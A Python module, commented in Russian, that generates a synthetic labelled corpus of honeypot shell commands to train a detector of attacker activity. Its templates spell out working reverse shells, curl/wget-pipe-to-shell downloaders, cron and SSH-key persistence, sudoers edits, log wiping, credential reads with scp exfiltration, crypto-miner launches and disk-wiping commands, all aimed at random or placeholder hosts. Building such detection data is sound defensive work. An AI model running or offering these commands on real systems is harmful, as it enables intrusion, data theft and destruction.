"""Обучающий корпус HoneyMind: синтетический, собранный из шаблонов типовых действий ботнетов и операторов.

ЧЕСТНО О ПРОИСХОЖДЕНИИ ДАННЫХ
  * Публичные логи Cowrie содержат поведение, но не содержат меток «опасно/нет». Разметка тут — слабая:
    метка = класс шаблона, из которого сгенерирована команда (а не результат работы правил из rules.py).
  * Шаблоны написаны по публично описанным семействам (Mirai/Gafgyt-подобные загрузчики, SSH-key-инжекторы,
    xmrig/kinsing-дропперы, классические reverse shell и т. п.), а не выдуманы «с потолка», но это всё
    равно синтетика, написанная тем же человеком, что и правила → оценка на ней оптимистична.
  * Поэтому качество замеряется НЕ здесь, а на независимой выборке (evalset.py: реальные команды из дампа
    CyberLab/Cowrie + вручную написанные «трудные» варианты), а CV идёт группами по шаблонам.
"""
from __future__ import annotations

import random
from dataclasses import dataclass

_TLDS = ["top", "xyz", "ru", "cn", "club", "info", "site", "online", "icu", "tk"]
_WORDS = ["cdn", "update", "dl", "files", "static", "mirror", "pkg", "bin", "stage", "host", "data", "net", "node"]
_FILES = ["mips", "mpsl", "arm", "arm5", "arm7", "x86", "x86_64", "sh4", "m68k", "ppc", "spc", "bins.sh", "update.sh",
          "setup.sh", "payload.sh", "xmr.sh", "clean.sh", "a.sh", "k", "x", "tsunami", "kaiten", "gafgyt", "bot",
          "dota3.tar.gz", "sshd", "systemd-helper", "ld.sh", "init.sh", "run", "kworkerds", "networkservice"]
_DIRS = ["", "", "bins/", "files/", "x/", "tmp/", "cdn/", "dl/", "~u/"]
_PATHS = ["/tmp", "/var/tmp", "/dev/shm", "/var/run", "/mnt", "/root", "/home/ubuntu", "/usr/bin", "/etc"]
_USERS = ["root", "admin", "ubuntu", "pi", "oracle", "test", "user", "support", "git", "ftp"]
_POOLS = ["pool.minexmr.com:4444", "xmr.pool.example-pool.net:3333", "pool.supportxmr.com:5555",
          "xmr-eu1.nanopool.org:14444", "gulf.moneroocean.stream:10128"]
_KEYS = ["ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC{b}== {u}@host", "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI{b} {u}@kali",
         "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEA{b}== mdrfckr"]
_B64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"


class _Fill:
    def __init__(self, rng: random.Random):
        self.r = rng

    def ip(self) -> str:
        r = self.r
        return f"{r.choice([5, 23, 45, 62, 77, 89, 103, 107, 141, 178, 185, 192, 193, 203, 212])}.{r.randint(1, 254)}.{r.randint(1, 254)}.{r.randint(1, 254)}"

    def host(self) -> str:
        r = self.r
        return f"{r.choice(_WORDS)}{r.choice(['', '-', '.'])}{r.choice(_WORDS)}.{r.choice(_TLDS)}"

    def addr(self) -> str:
        return self.ip() if self.r.random() < 0.6 else self.host()

    def url(self) -> str:
        r = self.r
        port = f":{r.choice([80, 8080, 8000, 81, 8888, 9999])}" if r.random() < 0.2 else ""
        scheme = "http" if r.random() < 0.85 else "https"
        return f"{scheme}://{self.addr()}{port}/{r.choice(_DIRS)}{r.choice(_FILES)}"

    def key(self) -> str:
        b = "".join(self.r.choice(_B64) for _ in range(self.r.randint(60, 140)))
        return self.r.choice(_KEYS).format(b=b, u=self.r.choice(_USERS))

    def wallet(self) -> str:
        return "4" + "".join(self.r.choice("0123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz") for _ in range(94))

    def word(self) -> str:
        return "".join(self.r.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZ") for _ in range(self.r.randint(4, 8)))

    def junk(self) -> str:
        return "".join(self.r.choice("abcdefghijklmnopqrstuvwxyz") for _ in range(self.r.randint(2, 8)))

    def b64blob(self) -> str:
        return "".join(self.r.choice(_B64) for _ in range(self.r.randint(20, 36))) + "="

    def hexbin(self) -> str:
        return "".join(f"\\x{self.r.randint(0, 255):02x}" for _ in range(self.r.choice([24, 32, 48])))

    def subst(self, tpl: str) -> str:
        r = self.r
        rep = {
            "@URL@": self.url, "@URL2@": self.url, "@IP@": self.ip, "@IP2@": self.ip, "@HOST@": self.host,
            "@F@": lambda: r.choice(_FILES), "@F2@": lambda: r.choice(_FILES), "@P@": lambda: r.choice(_PATHS),
            "@PORT@": lambda: str(r.choice([4444, 1337, 9001, 31337, 8080, 53, 443, 5555, 6666])),
            "@U@": lambda: r.choice(_USERS), "@POOL@": lambda: r.choice(_POOLS), "@WALLET@": self.wallet,
            "@KEY@": self.key, "@N@": lambda: str(r.randint(2, 9)), "@W@": self.word, "@HEXBIN@": self.hexbin, "@J@": self.junk, "@B64@": self.b64blob,
            "@ARCH@": lambda: r.choice(["armv5l", "armv7l", "mips", "mpsl", "x86", "XDarmv5l", "aarch64"]),
        }
        for k, fn in rep.items():
            while k in tpl:
                tpl = tpl.replace(k, fn(), 1)
        return tpl


# (template_id → шаблон). id нужен для группового разбиения при кросс-валидации.
TEMPLATES: dict[str, list[str]] = {
    "benign": [
        "@J@",
        "@J@ @J@",
        "@J@@N@",
        "Call-ID: @N@0000",
        "From: <sip:@J@@@J@>;tag=@J@",
        "To: <sip:@J@@@J@>",
        "Contact: <sip:@J@@@J@>",
        "Content-Length: @N@",
        "CSeq: @N@ OPTIONS",
        "Via: SIP/2.0/UDP @IP@:5060;branch=z9hG4bK@J@",
        "FEAT",
        "USER anonymous",
        "STAT",
        "OPTIONS * RTSP/1.0",
        "@B64@",
        "# @J@ @J@ (@J@)",
        "# Method @N@: @J@ to stdout",
        "start",
        "&k`g&k|zpkfq)ES[M",
        "ok",
        "yes",
        "no",
        "score+5",
        "(score+5)",
        "ncorrect",
        "asdf",
        "qwerty",
        "hello world",
        "1+1",
        "GET / HTTP/1.1",
        "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36",
        "Host: @IP@",
        "Accept: */*",
        "test",
        "ls", "ls -la", "ls -l @P@", "ls -lah /home", "pwd", "cd", "cd @P@", "cd ..", "cd ~", "clear", "exit", "logout",
        "echo hello", "echo test", "echo \"it works\"", "cat README.md", "cat notes.txt", "less log.txt", "head -n 5 file.txt",
        "touch test.txt", "mkdir test", "mkdir -p ~/work", "vim a.txt", "nano config.txt", "man ls", "help", "ll", "la",
        "ls | wc -l", "cd @P@ && ls", "tree", "history | tail", "date", "true", "sleep 1", "cp a.txt b.txt", "mv a.txt b.txt",
        "ls *.txt", "cd /var/www", "cd /var/www/html && ls -la", "rm test.txt", "stat file.txt", "wc -l file.txt",
    ],
    "reconnaissance": [
        ">@P@/d && chmod 777 @P@/d && @P@/d && cd @P@/",
        ">@P@/.f && /bin/busybox chmod 777 @P@/.f && @P@/.f && cd @P@/; ",
        "echo STARTED",
        "echo LOGGED",
        "echo DONE",
        "echo @W@",
        "echo '@W@'",
        "echo -e '\\x6b\\x61\\x6d\\x69@P@' > @P@/.nippon; cat @P@/.nippon; rm @P@/.nippon",
        "rm -rf .@W@ .@J@",
        "rm -rf .@W@",
        "rm -f .@W@",
        "rm .@W@",
        "ls -l @J@_@N@ 2>/dev/null || echo '0'",
        "echo @W@ >@P@/.testfile 2>&1",
        "head -c 0 > @P@/@J@_sign",
        "w",
        "top",
        "free -h",
        "enable",
        "system",
        "shell",
        "linuxshell",
        "sh",
        "ping; sh",
        "enable; system; shell; sh",
        "/bin/busybox @W@",
        "/bin/busybox ps; /bin/busybox @W@",
        "cat /proc/mounts; /bin/busybox @W@",
        "cd @P@; cat .s || cp /bin/echo .s; /bin/busybox @W@",
        "/bin/busybox cat /proc/self/exe || cat /proc/self/exe",
        "busybox dd if=$SHELL bs=22 count=1||dd if=/proc/self/exe bs=22 count=1||while read i;do busybox echo -n $i;done</proc/self/exe||cat /proc/self/exe",
        ">@P@/.@W@ && cd @P@/",
        ">/@W@ && cd /",
        ">@P@/.@W@",
        "/bin/busybox echo > @P@/.@W@ && sh @P@/.@W@ && cd @P@/",
        "/bin/busybox hostname @W@",
        "echo @W@_CHECK",
        "echo @W@OK",
        "echo -e \"\\x6F\\x6B\"",
        "cd /proc/; cat self/cmdline",
        "cat /proc/self/cmdline",
        "cd /proc; ls",
        "/bin/./uname -s -v -n -r -m",
        "uname -s -v -n -r -m",
        "/bin/busybox",
        "tftp; wget; /bin/busybox @W@",
        "which ls",
        "which @F@",
        "/bin/busybox cp /bin/busybox .@W@; >.@W@; /bin/busybox chmod 777 .@W@; /bin/busybox @W@",
        "/bin/busybox rm -rf .@W@ .@W@",
        "uname -a", "uname -m", "uname -s -v -n -r -m", "uname -a && whoami", "whoami", "id", "hostname", "hostname -I",
        "uptime", "w", "who", "last", "lastlog", "cat /proc/cpuinfo", "cat /proc/cpuinfo | grep name | wc -l",
        "cat /proc/cpuinfo | grep \"model name\" | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9}'", "cat /proc/meminfo | grep MemTotal",
        "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'", "lscpu | grep Model", "lscpu", "nproc", "df -h", "df -h | head -n 5",
        "cat /etc/issue", "cat /etc/os-release", "cat /etc/passwd", "cat /etc/hosts", "cat /etc/resolv.conf", "cat /proc/version",
        "ps aux", "ps -ef", "ps -ef | grep -v grep | grep ssh", "ps aux | wc -l", "top -bn1 | head -5", "netstat -antp", "netstat -tulpn", "ss -tulpn",
        "ifconfig", "ifconfig -a", "ip a", "ip addr show", "ip route", "env", "printenv", "crontab -l", "lsb_release -a",
        "which wget curl python perl gcc", "which curl", "which gcc", "which python3", "ls -lh $(which ls)", "ls /home", "ls -la /root",
        "ls -la @P@", "ls /tmp/.X11-unix", "find / -name \"*.conf\" 2>/dev/null | head", "getconf LONG_BIT", "arch",
        "touch @P@/.test && rm @P@/.test",
        "/bin/busybox @F@", "/bin/busybox ECCHI", "/bin/busybox MIRAI", "file /bin/ls", "mount", "lsblk", "dmesg | tail",
        "curl ifconfig.me", "wget -qO- icanhazip.com", "curl -s ipinfo.io", "ping -c 1 8.8.8.8", "nslookup google.com", "dig google.com",
        "echo $((1+1))", "/@F@", "dmidecode -t system", "cat /sys/class/dmi/id/product_name", "systemd-detect-virt", "ls /sys/class/net",
        "cat /proc/1/cgroup", "last -n 5", "w -h", "id -u", "groups", "cat /etc/group",
    ],
    "privilege_escalation": [
        "sudo -i", "sudo su", "sudo su -", "su -", "su root", "sudo /bin/bash", "sudo /bin/sh", "sudo -l", "sudo -u root /bin/sh", "sudo -n true",
        "find / -perm -4000 2>/dev/null", "find / -perm -u=s -type f 2>/dev/null", "find / -perm -2000 -type f 2>/dev/null",
        "chmod u+s /bin/bash", "chmod 4755 @P@/@F@", "chmod +s /usr/bin/find", "cp /bin/bash @P@/.sh && chmod 4777 @P@/.sh",
        "./linpeas.sh", "sh linpeas.sh", "./LinEnum.sh", "./pspy64", "gcc -o dirty dirty.c -pthread && ./dirty", "./dirtycow", "./exploit",
        "python exploit.py", "python3 CVE-2021-4034.py", "./pwnkit", "pkexec /bin/sh", "cat /etc/sudoers",
        "echo \"@U@ ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers", "echo '@U@ ALL=(ALL:ALL) NOPASSWD: ALL' | sudo tee -a /etc/sudoers",
        "sudo -s", "su - @U@", "id; sudo -n -l", "uname -r; searchsploit linux kernel", "capsh --print", "getcap -r / 2>/dev/null",
    ],
    "defense_evasion": [
        "for pid in /proc/[0-9]*; do pid_num=${pid##*/}; if [ -r \"$pid/maps\" ]; then kill -9 \"$pid_num\"; fi; done",
        "for pid in /proc/[0-9]*; do if grep -q deleted $pid/maps; then kill -9 ${pid##*/}; fi; done",
        "for p in $(ls /proc | grep -E '^[0-9]+$'); do kill -9 $p; done",
        "history -c", "history -c && history -w", "history -w; history -c", "history -n", "unset HISTFILE", 
        "export HISTFILE=/dev/null", "export HISTSIZE=0", "export HISTFILESIZE=0", "set +o history", "HISTFILE=/dev/null",
        "rm -rf /var/log/*", "rm -f /var/log/auth.log /var/log/secure", "echo > /var/log/auth.log", "echo > /var/log/wtmp", "cat /dev/null > ~/.bash_history",
        "rm -f ~/.bash_history", "ln -sf /dev/null ~/.bash_history", "rm -rf /root/.bash_history", "truncate -s 0 /var/log/syslog", "shred -u ~/.bash_history",
        "service iptables stop", "systemctl stop firewalld", "systemctl disable firewalld", "ufw disable", "iptables -F", "setenforce 0",
        "pkill -9 auditd", "killall -9 rsyslogd", "systemctl stop rsyslog", "kill -9 $(pidof syslogd)", "pkill -f aliyun", "service apparmor stop",
        "chattr -i /etc/passwd", "chattr +i @P@/@F@", "chattr -ia /root/.ssh/authorized_keys", "rm -rf /tmp/* /var/tmp/*",
        "export PATH=$PATH:/tmp && unset HISTFILE", "ulimit -n 999999; unset HISTFILE",
    ],
    "network_scan": [
        "nmap -sS @IP@/24", "nmap -p 22 @IP@", "nmap -sV -p- @IP@", "nmap -Pn -T4 @IP@/16", "masscan -p22 0.0.0.0/0 --rate 100000", "masscan @IP@/16 -p80,443",
        "zmap -p 22 -o out.txt", "./zmap -p 22", "./scan 22", "./masscan --ports 22 @IP@/8", "./ssh-scanner", "hydra -l root -P pass.txt ssh://@IP@",
        "hydra -L users.txt -P passwords.txt @IP@ ssh", "medusa -h @IP@ -u root -P p.txt -M ssh", "ncrack -p 22 @IP@",
        "ssh root@@IP@", "ssh -o StrictHostKeyChecking=no @U@@@IP@ id", "ssh @U@@@IP@ 'uname -a'", "scp @F@ @U@@@IP@:/tmp/", "scp -r @P@/data @U@@@IP@:/tmp",
        "nc -zv @IP@ 1-1000", "nc -z @IP@ 22", "ncat -z @IP@ 22-443", "nikto -h @IP@", "sqlmap -u http://@IP@/index.php?id=1", "gobuster dir -u http://@IP@ -w w.txt",
        "nuclei -u http://@IP@", "for i in $(seq 1 254); do ping -c1 192.168.1.$i & done", "for ip in $(cat ips.txt); do ssh root@$ip id; done",
        "arp -a", "arp-scan -l", "./scanner @IP@", "sshpass -p @U@ ssh @U@@@IP@",
    ],
    "persistence": [
        "echo \"root:@W@@N@@N@\"|chpasswd|bash",
        "echo -e \"@J@@N@@N@\\n@W@\\n@W@\"|passwd|bash",
        "echo \"@U@:@W@\" | chpasswd",
        "echo '@KEY@' >> ~/.ssh/authorized_keys", "echo \"@KEY@\" >> /root/.ssh/authorized_keys", "mkdir -p ~/.ssh", "mkdir /root/.ssh", "touch .ssh/authorized_keys",
        "rm -rf .ssh/authorized_keys", "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"@KEY@\" >> .ssh/authorized_keys && chmod -R go= ~/.ssh",
        "cat @F@.pub >> ~/.ssh/authorized_keys", "chmod 600 ~/.ssh/authorized_keys", "chattr +i ~/.ssh/authorized_keys",
        "echo \"*/5 * * * * curl -s @URL@ | sh\" | crontab -", "(crontab -l; echo \"@reboot @P@/@F@\") | crontab -", "echo '*/10 * * * * @P@/@F@' >> /etc/crontab",
        "echo \"0 * * * * wget -q -O- @URL@ | bash\" >> /var/spool/cron/root", "crontab @P@/cron.txt", "crontab -r",
        "echo '@P@/@F@ &' >> /etc/rc.local", "echo 'sh @P@/@F@' >> ~/.bashrc", "echo '@P@/@F@' >> ~/.profile", "echo '@P@/@F@' >> /etc/init.d/@F2@",
        "useradd -ou 0 -g 0 @U@", "useradd -m -s /bin/bash @U@", "adduser @U@", "echo \"@U@:Passw0rd123\" | chpasswd", "echo 'root:@F@123' | chpasswd", "usermod -aG sudo @U@",
        "passwd", "passwd @U@", "systemctl enable @F@.service", "systemctl daemon-reload", "cat > /etc/systemd/system/@F@.service << EOF", "update-rc.d @F@ defaults",
        "chkconfig @F@ on", "echo @P@/@F@.so >> /etc/ld.so.preload", "echo '@P@/@F@' > /etc/ld.so.preload",
    ],
    "credential_access": [
        "cat /etc/shadow", "cat /etc/passwd /etc/shadow", "head /etc/shadow", "cp /etc/shadow @P@/s.txt", "unshadow /etc/passwd /etc/shadow > h.txt",
        "cat /root/.ssh/id_rsa", "cat ~/.ssh/id_rsa", "cat /home/@U@/.ssh/id_ed25519", "find / -name id_rsa 2>/dev/null", "find / -name \"*.pem\" 2>/dev/null",
        "cat ~/.aws/credentials", "cat /root/.aws/credentials", "cat ~/.pgpass", "cat ~/.git-credentials", "cat ~/.docker/config.json", "cat ~/.kube/config",
        "cat ~/.netrc", "cat /etc/mysql/debian.cnf", "cat ~/.my.cnf", "cat wp-config.php", "cat /var/www/html/wp-config.php", "cat .env", "cat /var/www/.env",
        "cat secrets.yml", "cat secrets.json", "cat passwords.txt", "cat passwords.csv", "cat /home/@U@/.bash_history", "cat /root/.bash_history",
        "grep -ri password /var/www 2>/dev/null", "grep -r 'password' /etc 2>/dev/null", "tar czf @P@/k.tgz ~/.ssh", "tar czf @P@/b.tgz /root/.aws /root/.ssh",
        "scp ~/.ssh/id_rsa @U@@@IP@:/tmp", "base64 ~/.ssh/id_rsa", "strings /proc/*/environ | grep -i pass", "./mimipenguin", "python lazagne.py all", "john hashes.txt", "hashcat -m 1800 h.txt w.txt",
        "cat /etc/shadow | head -n 3", "cat backup_credentials.txt",
    ],
    "malware_execution": [
        "sh .s; rm -f .s",
        "sh .@J@",
        "bash .@J@; rm -f .@J@",
        "chmod 777 update.sh 2>&1",
        "chmod 777 update.@ARCH@ 2>&1",
        "./@F@ &",
        "./@J@",
        "chmod +x @F@", "chmod +x @P@/@F@", "chmod 777 @F@", "chmod 755 @P@/@F@", "chmod +x @F@ && ./@F@", "chmod 777 @F@; ./@F@", "chmod +x @F@; sh @F@",
        "./@F@", "./@F@ @N@", "./@F@ &", "./@F@ > /dev/null 2>&1 &", "@P@/@F@", "@P@/@F@ &", "/tmp/.@F@/@F2@", "nohup ./@F@ &", "nohup @P@/@F@ > /dev/null 2>&1 &",
        "setsid ./@F@", "setsid @P@/@F@ &", "sh @F@.sh", "bash @F@.sh", "sh @P@/@F@.sh", "bash /tmp/@F@.sh &", "dash a.sh", "sh ./@F@.sh >/dev/null 2>&1",
        "python @F@.py &", "python3 @P@/@F@.py", "perl @F@.pl", "perl @P@/@F@.pl &", "php @F@.php",
        "echo cHJpbnQgImhpIg== | base64 -d | sh", "echo d2dldCBodHRwOi8vMS4yLjMuNC94 | base64 -d | bash", "eval $(echo YmFzaCBpIHRlc3Q= | base64 -d)",
        "tar xzf @F@.tar.gz && cd @F@ && ./start", "tar xvf @F@.tgz; cd @F@; ./run", "unzip a.zip; ./a", "cat @F@ | sh", "cat a.sh | bash",
        "python -c 'import os; os.system(\"@P@/@F@\")'", "LD_PRELOAD=@P@/@F@.so ./@F2@", "cd @P@; chmod +x @F@; ./@F@", "cd @P@ && ./@F@ &",
        "w\\get; chmod +x @F@; ./@F@",
    ],
    "malware_downloader": [
        "echo 'chmod +x .c && ./.c && break || chmod +x $a && ./$a && break' >> .s",
        "echo 'for a in mips mpsl arm4 arm5 arm6 arm7 x86_64 x86; do' >> .s",
        "echo 'rm -f .c $a' >> .s",
        "echo 'cd /tmp||cd /var/run||cd /mnt||cd /root||cd /' >> .s",
        "echo '#!/bin/sh' > .s",
        "echo 'done' >> .@J@",
        "echo 'wget -q @URL@ -O .c||curl -s @URL@ -o .c||tftp -g -l .c -r @F@ @IP@' >> .s",
        "echo -ne \"@HEXBIN@\" >> update.@ARCH@",
        "echo -ne \"@HEXBIN@\" >> @F@",
        "echo -en \"@HEXBIN@\" > @P@/@F@",
        "echo -e '@HEXBIN@' >> @F@",
        "cd @P@; echo -ne \"@HEXBIN@\" >> @F@",
        "wget -q -t 2 -T 10 -O bot @URL@ 2>/dev/null && echo WGETOK",
        "wget @URL@ -O-",
        "cd @P@; wget @URL@ -O- | sh",
        "/bin/busybox tftp -g @HOST@ -r tftp.sh -l- | sh",
        "ftpget @IP@ f ftpget",
        "/bin/busybox ftpget @IP@ @F@ @F@ && sh @F@",
        "uname -a; curl -s -L @URL@ -o @P@/@F@; perl @P@/@F@",
        "wget @URL@", "wget -q @URL@", "wget -c @URL@", "wget --no-check-certificate @URL@", "wget @URL@ -O @P@/@F@", "wget -O @F@ @URL@", "curl -O @URL@",
        "curl -s @URL@ -o @P@/@F@", "curl --output @F@ @URL@", "curl -fsSL @URL@ | bash", "curl -s @URL@ | sh", "wget -qO- @URL@ | sh", "wget -q -O - @URL@ | bash",
        "cd @P@; wget @URL@; chmod +x @F@; ./@F@", "cd @P@ && wget @URL@ && chmod 777 @F@ && ./@F@", "cd @P@; curl -O @URL@; sh @F@",
        "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget @URL@; curl -O @URL@; chmod 777 @F@; sh @F@",
        "rm -rf @F@; wget @URL@; chmod +x @F@; ./@F@", "wget @URL@; sh @F@; rm -rf @F@",
        "wget @URL@ -O @P@/@F@ && chmod 777 @P@/@F@ && @P@/@F@", "busybox wget @URL@", "/bin/busybox wget @URL@ -O @F@", "busybox tftp -g -r @F@ @IP@", "tftp -g -r @F@ @IP@",
        "tftp @IP@ -c get @F@", "ftpget -v -u anonymous -p anonymous @IP@ @F@ @F@", "lwp-download @URL@ @F@", "aria2c @URL@", "fetch @URL@", "wget ftp://@IP@/@F@",
        "curl -sL @URL@ | python", "wget @URL@ && tar xzf @F@.tar.gz", "wget @URL@ && unzip @F@.zip", "cd /dev/shm && wget @URL@", "curl http://@IP@:@PORT@/@F@ -o @F@",
        "wget http://@HOST@/@F@ -O- | sh", "curl -k https://@HOST@/@F@ | bash",
    ],
    "cryptominer": [
        "./xmrig -o @POOL@ -u @WALLET@ -p x", "./xmrig --donate-level 1 -o stratum+tcp://@POOL@ -u @WALLET@", "nohup ./xmrig -o @POOL@ -u @WALLET@ -k --tls &",
        "@P@/xmrig -o @POOL@ -u @WALLET@ -p x --background", "./minerd -a cryptonight -o stratum+tcp://@POOL@ -u @WALLET@ -p x", "nohup ./minerd -o stratum+tcp://@POOL@ &",
        "./cpuminer -a scrypt -o stratum+tcp://@POOL@ -u @U@", "./cpuminer-multi -a cryptonight -o stratum+tcp://@POOL@", "./xmr-stak --config config.txt", "./ethminer -P stratum://@WALLET@@@POOL@",
        "./kdevtmpfsi", "@P@/kdevtmpfsi &", "./kinsing", "pkill -f kinsing", "pkill xmrig", "killall -9 minerd", "ps aux | grep xmrig", "ps -ef | grep -i miner | grep -v grep",
        "echo 'vm.nr_hugepages=128' >> /etc/sysctl.conf && sysctl -p", "sysctl -w vm.nr_hugepages=128", "cat config.json | grep pool", "./sshd -c config.json", "./xmrig --cpu-priority 5 -o @POOL@",
        "./miner --algo randomx --pool @POOL@ --user @WALLET@", "./nicehash-miner", "echo 'stratum+tcp://@POOL@' > pools.txt", "grep -r stratum+tcp /tmp", "./monero-miner --pool @POOL@",
    ],
    "destructive": [
        "rm -rf /*", "rm -rf /", "rm -rf --no-preserve-root /", "rm -rf ~/*", "rm -rf /etc /boot", "rm -rf /home", "rm -rf /var/lib/mysql", "rm -rf /usr", "rm -rf /bin /sbin /lib",
        "dd if=/dev/zero of=/dev/sda bs=1M", "dd if=/dev/urandom of=/dev/sda", "dd if=/dev/zero of=/dev/sda1 bs=4096", "dd if=/dev/zero of=/dev/nvme0n1", "mkfs.ext4 /dev/sda1", "mkfs -t ext4 /dev/sda",
        "mkfs.xfs /dev/vda1", ":(){ :|:& };:", "shred -vfz -n 5 /dev/sda", "wipefs -a /dev/sda", "> /dev/sda", "cat /dev/zero > /dev/sda", "chmod -R 000 /", "chown -R nobody /",
        "find / -type f -delete", "find / -name \"*.php\" -exec rm {} \\;", "truncate -s 0 /etc/passwd", "mv /home/* /dev/null", "echo c > /proc/sysrq-trigger", "echo 1 > /proc/sys/kernel/sysrq && echo b > /proc/sysrq-trigger",
        "rm -rf /var/www/html/*", "rm -rf /root/*", "cat /dev/urandom > /dev/sda1", "rm -rf /opt /srv /var",
    ],
    "reverse_shell": [
        "bash -i >& /dev/tcp/@IP@/@PORT@ 0>&1", "/bin/bash -i >& /dev/tcp/@IP@/@PORT@ 0>&1", "bash -c 'bash -i >& /dev/tcp/@IP@/@PORT@ 0>&1'", "sh -i >& /dev/udp/@IP@/@PORT@ 0>&1",
        "0<&196;exec 196<>/dev/tcp/@IP@/@PORT@; sh <&196 >&196 2>&196", "exec 5<>/dev/tcp/@IP@/@PORT@; cat <&5 | while read line; do $line 2>&5 >&5; done",
        "nc -e /bin/sh @IP@ @PORT@", "nc -e /bin/bash @IP@ @PORT@", "nc @IP@ @PORT@ -e /bin/sh", "ncat @IP@ @PORT@ -e /bin/bash", "ncat --exec /bin/bash @IP@ @PORT@", "netcat -e /bin/sh @IP@ @PORT@",
        "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc @IP@ @PORT@ > /tmp/f", "mkfifo /tmp/p; nc @IP@ @PORT@ 0</tmp/p | /bin/sh 1>/tmp/p 2>&1",
        "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"@IP@\",@PORT@));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
        "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"@IP@\",@PORT@));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn(\"/bin/sh\")'",
        "perl -e 'use Socket;$i=\"@IP@\";$p=@PORT@;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");exec(\"/bin/sh -i\");};'",
        "php -r '$sock=fsockopen(\"@IP@\",@PORT@);exec(\"/bin/sh -i <&3 >&3 2>&3\");'", "ruby -rsocket -e'f=TCPSocket.open(\"@IP@\",@PORT@).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
        "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:@IP@:@PORT@", "socat tcp-connect:@IP@:@PORT@ exec:/bin/sh", "telnet @IP@ @PORT@ | /bin/bash | telnet @IP@ 9999",
        "openssl s_client -quiet -connect @IP@:@PORT@ | /bin/sh | openssl s_client -quiet -connect @IP@:9999", "busybox nc @IP@ @PORT@ -e /bin/sh", "setsid nc -e /bin/sh @IP@ @PORT@",
    ],
}

_PREFIXES = ["", "", "", "", "cd @P@; ", "cd @P@ && ", "cd /tmp; cd /var/run; cd @P@; "]
_SUFFIXES = ["", "", "", "", " > /dev/null 2>&1", " 2>/dev/null", " &", " >/dev/null"]
_NO_WRAP = {"benign", "reverse_shell"}


@dataclass(frozen=True)
class Sample:
    text: str
    label: str
    template: str   # уникальный ключ шаблона — для group-split


def build(per_template: int = 4, seed: int = 1337) -> list[Sample]:
    """Разворачивает шаблоны в корпус. Каждый шаблон даёт per_template вариаций (разные IP/URL/файлы/обёртки)."""
    rng = random.Random(seed)
    fill = _Fill(rng)
    out: list[Sample] = []
    for label, tpls in TEMPLATES.items():
        for i, tpl in enumerate(tpls):
            key = f"{label}:{i}"
            has_vars = "@" in tpl
            n = per_template if has_vars else 2
            seen: set[str] = set()
            for _ in range(n * 3):
                core = fill.subst(tpl)
                if label not in _NO_WRAP and rng.random() < 0.45:
                    core = fill.subst(rng.choice(_PREFIXES)) + core + rng.choice(_SUFFIXES)
                if core not in seen:
                    seen.add(core)
                    out.append(Sample(core, label, key))
                if len(seen) >= n:
                    break
    rng.shuffle(out)
    return out
